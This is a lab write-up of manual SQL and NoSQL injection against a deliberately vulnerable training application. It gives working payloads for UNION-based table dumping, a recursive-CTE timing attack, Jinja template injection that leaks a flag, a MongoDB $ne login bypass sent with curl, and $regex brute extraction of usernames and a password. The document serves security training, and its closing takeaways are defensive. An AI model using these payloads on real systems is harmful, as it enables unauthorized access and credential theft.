SQL & NoSQL Injection

Manual exploitation of SQL and NoSQL injection vulnerabilities against a deliberately vulnerable dexterGOAT-based training application (web0x01.hbtn). No automated tools (sqlmap, etc.) were used — every payload was hand-crafted and delivered via curl, with Firefox DevTools (Network tab) used for endpoint discovery and traffic inspection.

Target
Host: web0x01.hbtn (mapped via /etc/hosts to the sandbox's local IP)
Application: dexterGOAT (OWASP-style intentionally vulnerable app)
Backend database (SQL modules): SQLite
Backend database (NoSQL modules): MongoDB
Methodology

Across every task, the same core workflow was used:

Recon — browse the app manually, watch the Network tab to find the real underlying API endpoints and request/response shapes (the rendered UI often hid the actual parameter names).
Baseline — capture a clean, valid request/response to compare against.
Probe — send minimal payloads (', ' OR '1'='1, JSON operators like $ne/$regex) and observe behavioral differences (status code, response size, row count, error text) rather than assuming success/failure.
Escalate — once a parameter was confirmed vulnerable, build toward the task's actual goal (data extraction, blind timing, template injection, business-logic bypass).
Task 0 — Basic Injection Discovery

Goal: Identify the vulnerable parameter on the Orders page.

Used Firefox DevTools to capture the real API call behind the "Search" and "Status" filters:

GET /api/a3/sql_injection/all_orders?status=pending

Testing:

status=pending → 5 legitimate rows (baseline)
status=pending' → [] (raw quote breaks the query, silently)
status=pending' OR '1'='1 → all 24 rows returned, confirming a classic boolean-based SQL injection on the status parameter.

Answer (0-vuln.txt): status

Task 1 — Extracting Database Information

Goal: Extract DB version and table names.

Determined column count via the visible response shape (5 columns).
Confirmed UNION SELECT injection worked:
   status=pending' UNION SELECT 1,2,3,4,5-- -
Extracted the engine identity via version():
   status=pending' UNION SELECT 1,version(),3,4,5-- -

→ Response revealed the engine as SQLite, plus the task flag. 4. Enumerated all tables via SQLite's schema catalog (no information_schema in SQLite):

   status=pending' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'-- -

→ Orders, Users, not_me, RandomTable1–RandomTable10

Flag (1-flag.txt): captured via version() output.

Task 2 — Data Exfiltration from a Specific Table

Goal: Extract a flag from a specific table.

Users looked like the obvious target but was empty (count(*) = 0) — a decoy.
Row-counted every table; all RandomTable* and not_me had exactly 1 row.
Pulled each table's schema via sqlite_master.sql and found not_me had a distinctive name column (unlike the generic RandomTable* structure) — a strong signal it held something meaningful rather than filler data.
Dumped it:
  status=pending' UNION SELECT id, value, name, 4, 5 FROM not_me-- -

→ returned name = "FLAG", value = <flag>.

Flag (2-flag.txt): captured from the not_me table's value column.

Task 3 — Time-Based Blind Injection

Goal: Force a >5 second delay to trigger a blind-injection flag.

SQLite has no SLEEP() function, so classic MySQL/Postgres/MSSQL delay payloads don't apply. Used a recursive CTE to force expensive computation instead:

sql
status=pending' AND (WITH RECURSIVE r(i) AS (
    SELECT 1 UNION ALL SELECT i+1 FROM r WHERE i<4500000
) SELECT count(*) FROM r)-- -

Calibrated the recursion bound iteratively (measuring with time curl ...):

3,000,000 → ~4.1s
4,500,000 → ~6.1s ✅ (past the 5s threshold)

The flag was returned in-band in the response body once the delay threshold was crossed — no separate leak channel needed.

Flag (3-flag.txt): returned directly once query time exceeded 5s.

Task 4 — Second-Order Blind Injection (SSTI)

Goal: Exploit a payload that lies dormant at registration and fires at login, leaking a flag via a Jinja template error.

Registered a user with a benign name and confirmed the login response rendered it into HTML: "<h1>Welcome Mr {name}</h1>" — indicating server-side template rendering (Jinja2), not just string interpolation.
Tested classic SSTI probe at registration:
json
   {"username": "ssti1", "name": "{{7*7}}", "password": "password123"}

→ confirmed evaluation (49 rendered instead of literal {{7*7}}). 3. Registered with name referencing the flag variable directly:

json
   {"username": "ssti2", "name": "{{FLAG}}", "password": "password123"}
Logging in rendered the template server-side, evaluating {{FLAG}} and leaking its value into the html field of the login response.

Flag (4-flag.txt): leaked via SSTI ({{FLAG}}) rendered at login.

Task 5 — NoSQLi: Discovering Injection Vulnerabilities

Goal: Identify a NoSQL-injectable endpoint (non-destructively).

Found the login form's real endpoint via DevTools Network tab:

POST /api/a3/nosql_injection/sign_in
Content-Type: application/json
{"username": "...", "password": "..."}

Confirmed MongoDB-style operator injection was possible by sending JSON objects instead of strings for username/password (e.g. {"$ne": ""}) and observing the app accept them as query operators rather than literal values.

Answer (5-vuln.txt): /api/a3/nosql_injection/sign_in

Task 6 — NoSQLi: Login Bypass

Goal: Bypass authentication via NoSQL injection.

bash
curl -s -X POST "http://web0x01.hbtn/api/a3/nosql_injection/sign_in" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

Backend built a query roughly equivalent to db.users.findOne({username: <input>, password: <input>}) without type validation — supplying operator objects instead of strings turned user input into live MongoDB query logic, bypassing authentication entirely.

Flag (6-flag.txt): returned directly on successful bypass.

Task 7 — NoSQLi: Enumerating for Profit

Goal: Identify a high-balance user via NoSQL injection, then acquire ≥1 HBTNc on the in-app exchange.

Username enumeration (blind, character-by-character)

Used $regex prefix matching to reconstruct real usernames one character at a time, without ever needing a valid password:

json
{"username": {"$regex": "^<prefix>"}, "password": {"$ne": ""}}

A recursive script walked the character space (a-z, 0-9, symbols), extending any prefix that returned a successful login, and backtracking otherwise. This revealed several accounts (abdou, dexter, foued, hugo, and — after widening the charset to include -/. — elon-musk, whose balance ($156,928.59) was the only one anywhere near the ~$100,559 cost of 1 HBTNc.

Exchange authorization bypass

Logging in as elon-musk via the $ne operator bypass authenticated the session, but calls to the exchange endpoint (POST /api/a3/nosql_injection/exchange) consistently returned "Unauthorized Exchange!" — regardless of amount, direction (Buy/Sell), or coin, including further operator-injection attempts on the trade fields themselves. This indicated the exchange endpoint enforced a stricter check than the login gate — an operator-bypassed session wasn't sufficient.

Fix: extended the same $regex enumeration technique to the password field (scoped to the known elon-musk username) to reconstruct the actual plaintext password, character by character. Logging in with genuine credentials (not an operator bypass) produced a session that passed the exchange endpoint's authorization check.

With a fully-authenticated session, submitted a legitimate Buy order for HBTNc, crossing the 1.0 HBTNc holding threshold and triggering the final flag.

Flag (7-flag.txt): revealed after successfully holding ≥1 HBTNc.

Key Takeaways
UI restrictions ≠ backend restrictions. Dropdowns, fixed values, and client-side validation tell you nothing about what the server actually accepts — always test the raw endpoint.
Silent failure is still a signal. Several vulnerable parameters here never threw a visible SQL/NoSQL error; the tell was a behavioral difference (row counts, response size, timing) rather than an exception.
SQLite ≠ MySQL. Time-based blind and schema-enumeration techniques had to be adapted (sqlite_master instead of information_schema, recursive CTEs instead of SLEEP()).
Auth bypass and full authorization are not the same thing. A NoSQL operator bypass was enough to log in, but not enough to pass a finance-sensitive authorization check further down the stack — a good reminder that "logged in" and "trusted" can be enforced at different layers, deliberately or not.
Enumeration techniques generalize. The same blind, character-by- character $regex extraction used for usernames worked identically for passwords once scoped to a known username.
Tooling
curl (all requests — no sqlmap or other automated injection tools)
Firefox DevTools (Network / Storage tabs) for endpoint and session discovery
Small Python/Bash scripts for recursive blind enumeration ($regex prefix walking)
Repo Structure
web_application_security/0x03_sql_nosql_injection/
├── 0-vuln.txt
├── 1-flag.txt
├── 2-flag.txt
├── 3-flag.txt
├── 4-flag.txt
├── 5-vuln.txt
├── 6-flag.txt
├── 7-flag.txt
└── README.md
